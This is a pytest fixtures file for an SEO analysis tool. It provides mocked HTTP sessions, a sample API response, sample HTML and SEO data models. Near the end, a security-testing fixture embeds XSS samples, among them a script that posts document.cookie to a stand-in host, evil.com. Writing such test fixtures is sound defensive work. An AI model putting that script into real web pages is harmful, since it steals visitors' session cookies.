"""Shared fixtures and configuration for Data for SEO tests."""

import asyncio
import json
import os
from datetime import datetime
from typing import Any, Dict, List, Optional
from unittest.mock import AsyncMock, MagicMock
from uuid import uuid4

import pytest
from pydantic import HttpUrl

from src.data_for_seo.config.settings import Settings, get_settings
from src.data_for_seo.models.base import ExecutionResult, SEOTask, TaskPriority, TaskStatus
from src.data_for_seo.models.seo import (
    AuditSeverity,
    ContentType,
    KeywordData,
    KeywordDifficulty,
    RankingData,
    SearchEngine,
    SEOAnalysis,
    SEOProject,
    TechnicalAudit,
)


# Test Configuration
@pytest.fixture(scope="session")
def test_settings() -> Settings:
    """Get test settings with safe defaults."""
    return Settings(
        environment="test",
        debug=True,
        log_level="DEBUG",
        api_timeout=30,
        request_timeout=10,
        user_agent="DataForSEO-Test-Agent/1.0",
    )


# Mock External Services
@pytest.fixture
def mock_aiohttp_session():
    """Mock aiohttp session for HTTP requests."""
    session_mock = AsyncMock()
    response_mock = AsyncMock()
    
    # Default successful response
    response_mock.status = 200
    response_mock.headers = {"content-type": "text/html"}
    response_mock.text.return_value = "<html><head><title>Test Page</title></head><body>Test content</body></html>"
    response_mock.json.return_value = {"status": "success"}
    response_mock.url = "https://example.com"
    
    session_mock.get.return_value.__aenter__.return_value = response_mock
    session_mock.post.return_value.__aenter__.return_value = response_mock
    
    return session_mock


@pytest.fixture
def mock_dataforseo_response():
    """Mock Data for SEO API response."""
    return {
        "status_code": 20000,
        "status_message": "Ok.",
        "time": "0.123",
        "cost": 0.01,
        "tasks_count": 1,
        "tasks_error": 0,
        "tasks": [
            {
                "id": str(uuid4()),
                "status_code": 20000,
                "status_message": "Ok.",
                "time": "0.123",
                "cost": 0.01,
                "result_count": 1,
                "path": ["v3", "serp", "google", "organic", "live", "advanced"],
                "data": {
                    "api": "serp",
                    "function": "live_advanced",
                    "keyword": "test keyword",
                    "location_code": 2840,
                    "language_code": "en",
                    "device": "desktop",
                    "os": "windows",
                },
                "result": [
                    {
                        "keyword": "test keyword",
                        "type": "organic",
                        "se_domain": "google.com",
                        "location_code": 2840,
                        "language_code": "en",
                        "check_url": "https://www.google.com/search?q=test+keyword",
                        "datetime": "2024-01-01 12:00:00 +00:00",
                        "spell": None,
                        "refinement_chips": None,
                        "item_types": ["organic"],
                        "se_results_count": 1234567,
                        "items_count": 10,
                        "items": [
                            {
                                "type": "organic",
                                "rank_group": 1,
                                "rank_absolute": 1,
                                "position": "left",
                                "xpath": "/html[1]/body[1]/div[6]/div[1]/div[9]/div[1]/div[1]/div[2]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/span[1]/a[1]",
                                "domain": "example.com",
                                "title": "Test Page Title - Example Domain",
                                "url": "https://example.com/test-page",
                                "cache_url": "https://webcache.googleusercontent.com/search?q=cache:example.com",
                                "related_search_url": None,
                                "breadcrumb": "example.com › test-page",
                                "website_name": "Example Domain",
                                "description": "This is a test page description for example domain with relevant content.",
                                "pre_snippet": None,
                                "extended_snippet": None,
                                "amp_version": False,
                                "rating": None,
                                "highlighted": ["test"],
                                "links": [
                                    {
                                        "type": "sitelink",
                                        "title": "About Us",
                                        "description": "Learn more about Example Domain",
                                        "url": "https://example.com/about",
                                    }
                                ],
                                "faq": None,
                                "extended_people_also_ask": None,
                            }
                        ],
                    }
                ],
            }
        ],
    }


# Test Data Fixtures
@pytest.fixture
def sample_html_content():
    """Sample HTML content for testing."""
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="This is a test page for SEO analysis with proper meta description length.">
        <meta name="robots" content="index, follow">
        <title>Test Page Title for SEO Analysis</title>
        <link rel="canonical" href="https://example.com/test-page">
        <script type="application/ld+json">
        {
            "@context": "https://schema.org",
            "@type": "WebPage",
            "name": "Test Page",
            "description": "Test page for SEO analysis"
        }
        </script>
    </head>
    <body>
        <header>
            <h1>Main Heading for Test Page</h1>
            <nav>
                <a href="/home">Home</a>
                <a href="/about">About</a>
                <a href="https://external-site.com">External Link</a>
            </nav>
        </header>
        <main>
            <h2>Secondary Heading</h2>
            <p>This is the main content of the test page. It contains multiple paragraphs with sufficient word count for SEO analysis.</p>
            <p>The content includes target keywords and related terms to test keyword density analysis functionality.</p>
            
            <h3>Tertiary Heading</h3>
            <ul>
                <li>First list item with content</li>
                <li>Second list item with more content</li>
                <li>Third list item for comprehensive testing</li>
            </ul>
            
            <img src="/test-image.jpg" alt="Test image with proper alt text">
            <img src="/no-alt-image.jpg">
            
            <h2>Another Secondary Heading</h2>
            <p>Additional content paragraph to increase word count and test content structure analysis.</p>
        </main>
        <footer>
            <p>&copy; 2024 Test Domain. All rights reserved.</p>
        </footer>
    </body>
    </html>
    """


@pytest.fixture
def sample_seo_task():
    """Sample SEO task for testing."""
    return SEOTask(
        name="Test SEO Analysis",
        description="Comprehensive SEO analysis for test page",
        task_type="seo_analysis",
        priority=TaskPriority.HIGH,
        parameters={
            "url": "https://example.com/test-page",
            "target_keywords": ["test keyword", "seo analysis", "example"],
            "comprehensive": True,
        },
        tags=["test", "seo", "analysis"],
    )


@pytest.fixture
def sample_keyword_data():
    """Sample keyword data for testing."""
    return KeywordData(
        keyword="test keyword",
        search_volume=1000,
        keyword_difficulty=KeywordDifficulty.MEDIUM,
        cpc=1.25,
        competition=0.65,
        current_position=5,
        previous_position=7,
        position_change=2,
        search_engine=SearchEngine.GOOGLE,
        location="United States",
        language="en",
        related_keywords=["related keyword 1", "related keyword 2"],
        long_tail_keywords=["test keyword phrase", "long tail test keyword"],
        url="https://example.com/test-page",
    )


@pytest.fixture
def sample_ranking_data():
    """Sample ranking data for testing."""
    return RankingData(
        url="https://example.com/test-page",
        keyword="test keyword",
        position=3,
        search_engine=SearchEngine.GOOGLE,
        location="United States",
        device_type="desktop",
        featured_snippet=False,
        local_pack=False,
        image_pack=False,
        video_results=False,
        click_through_rate=0.15,
        impressions=1500,
        clicks=225,
        position_history=[
            {"date": "2024-01-01", "position": 5},
            {"date": "2024-01-02", "position": 4},
            {"date": "2024-01-03", "position": 3},
        ],
    )


@pytest.fixture
def sample_seo_analysis():
    """Sample SEO analysis result for testing."""
    return SEOAnalysis(
        url="https://example.com/test-page",
        title="Test Page Title for SEO Analysis",
        meta_description="This is a test page for SEO analysis with proper meta description length.",
        word_count=150,
        heading_structure={"h1": 1, "h2": 2, "h3": 1, "h4": 0, "h5": 0, "h6": 0},
        keyword_density={"test": 2.5, "keyword": 1.8, "seo": 1.2, "analysis": 1.0},
        page_load_time=1.2,
        mobile_friendly=True,
        https_enabled=True,
        internal_links=2,
        external_links=1,
        broken_links=[],
        images_count=2,
        images_without_alt=1,
        schema_markup=["WebPage"],
        seo_score=85.0,
        content_score=78.0,
        technical_score=92.0,
    )


@pytest.fixture
def sample_technical_audit():
    """Sample technical audit result for testing."""
    return TechnicalAudit(
        url="https://example.com",
        audit_type="site",
        page_speed_desktop=85.0,
        page_speed_mobile=78.0,
        first_contentful_paint=1.2,
        largest_contentful_paint=2.1,
        cumulative_layout_shift=0.05,
        robots_txt_exists=True,
        sitemap_exists=True,
        crawl_errors=[],
        indexing_issues=[],
        duplicate_content=[],
        missing_meta_descriptions=["/page-without-meta"],
        missing_title_tags=[],
        broken_internal_links=["/broken-link"],
        mobile_friendly_issues=[],
        accessibility_issues=["Missing alt text on 2 images"],
        https_issues=[],
        schema_errors=[],
        critical_issues=0,
        warning_issues=2,
        info_issues=1,
        technical_health_score=82.0,
        pages_audited=10,
    )


@pytest.fixture
def sample_seo_project():
    """Sample SEO project for testing."""
    return SEOProject(
        name="Test SEO Project",
        description="Comprehensive SEO project for example.com",
        domain="example.com",
        target_urls=["https://example.com", "https://example.com/about", "https://example.com/services"],
        target_keywords=["test keyword", "seo analysis", "example domain"],
        search_engines=[SearchEngine.GOOGLE, SearchEngine.BING],
        locations=["United States", "United Kingdom"],
        languages=["en"],
        config={
            "tracking_frequency": "daily",
            "competitor_tracking": True,
            "technical_audits": True,
        },
        tags=["client-a", "ecommerce", "priority"],
    )


# Agent Fixtures
@pytest.fixture
def seo_analyzer_agent(test_settings):
    """SEO Analyzer Agent instance for testing."""
    # Import here to avoid circular import issues
    from src.data_for_seo.agents.seo_analyzer import SEOAnalyzerAgent
    agent = SEOAnalyzerAgent(config={"test_mode": True})
    agent.settings = test_settings
    return agent


# Execution Result Fixtures
@pytest.fixture
def success_execution_result():
    """Successful execution result for testing."""
    return ExecutionResult.success_result(
        message="Task completed successfully",
        data={"result": "success", "metrics": {"score": 85.0}},
        execution_time=1.23,
    )


@pytest.fixture
def failure_execution_result():
    """Failed execution result for testing."""
    return ExecutionResult.failure_result(
        message="Task execution failed",
        errors=["Network timeout", "Invalid response"],
        execution_time=0.5,
    )


# Mock Data for API Responses
@pytest.fixture
def mock_page_data():
    """Mock page data response."""
    return {
        "content": """
        <html>
        <head>
            <title>Test Page</title>
            <meta name="description" content="Test page description">
        </head>
        <body>
            <h1>Main Heading</h1>
            <p>Test content for analysis.</p>
        </body>
        </html>
        """,
        "status_code": 200,
        "headers": {"content-type": "text/html"},
        "response_time": 0.5,
        "url": "https://example.com/test",
    }


# Async Test Utilities
@pytest.fixture
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


# Test Environment Setup
@pytest.fixture(autouse=True)
def setup_test_environment(monkeypatch):
    """Set up test environment variables."""
    monkeypatch.setenv("ENVIRONMENT", "test")
    monkeypatch.setenv("LOG_LEVEL", "DEBUG")
    monkeypatch.setenv("DATAFORSEO_USERNAME", "test_user")
    monkeypatch.setenv("DATAFORSEO_PASSWORD", "test_pass")


# Performance Test Utilities
@pytest.fixture
def performance_timer():
    """Timer utility for performance tests."""
    class Timer:
        def __init__(self):
            self.start_time = None
            self.end_time = None
        
        def start(self):
            self.start_time = datetime.utcnow()
        
        def stop(self):
            self.end_time = datetime.utcnow()
        
        @property
        def duration(self) -> float:
            if self.start_time and self.end_time:
                return (self.end_time - self.start_time).total_seconds()
            return 0.0
    
    return Timer()


# Database Mock Fixtures (for future database testing)
@pytest.fixture
def mock_vector_store():
    """Mock vector store for knowledge base testing."""
    store_mock = AsyncMock()
    store_mock.store_seo_pattern.return_value = True
    store_mock.query_similar.return_value = [
        {"content": "SEO best practice 1", "score": 0.95},
        {"content": "SEO best practice 2", "score": 0.87},
    ]
    return store_mock


@pytest.fixture
def mock_redis_client():
    """Mock Redis client for caching tests."""
    client_mock = AsyncMock()
    client_mock.get.return_value = None
    client_mock.set.return_value = True
    client_mock.exists.return_value = False
    return client_mock


# Security Test Fixtures
@pytest.fixture
def malicious_html_content():
    """Malicious HTML content for security testing."""
    return """
    <html>
    <head>
        <title>Malicious Page</title>
        <script>alert('XSS');</script>
    </head>
    <body>
        <h1>Test</h1>
        <script>
            document.cookie = "stolen=true";
            fetch('http://evil.com/steal', {method: 'POST', body: document.cookie});
        </script>
        <iframe src="javascript:alert('XSS')"></iframe>
    </body>
    </html>
    """


# Cleanup Fixtures
@pytest.fixture(scope="function", autouse=True)
def cleanup_after_test():
    """Clean up resources after each test."""
    yield
    # Cleanup logic here if needed
    pass